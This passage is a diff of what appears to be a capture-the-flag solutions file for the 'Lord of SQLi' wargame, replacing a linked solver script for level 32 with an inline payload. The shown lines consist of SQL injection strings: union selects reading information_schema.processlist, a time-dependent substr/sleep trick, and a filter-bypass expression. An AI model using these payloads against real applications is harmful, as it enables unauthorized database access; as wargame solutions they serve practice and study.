@@ -203,7 +203,7 @@ using information_schema.processlist
 1' union select substr(info,locate('1',info),length(info)-locate('1',info)) from information_schema.processlist#  
 
 ### 32 ALIEN
-REL [alien.py](https://github.com/seolaf/lord-of-sqli/blob/main/32_alien.py)
+?no=0 union select substr(0x61646d696e,now()%2,5)%23' union select substr(0x61646d696e,now()%2+1,5)%23 union select sleep(1)%23
 
 ### 33 CTHULHU
 -1'<@=1 or {a 1}=1 or '  
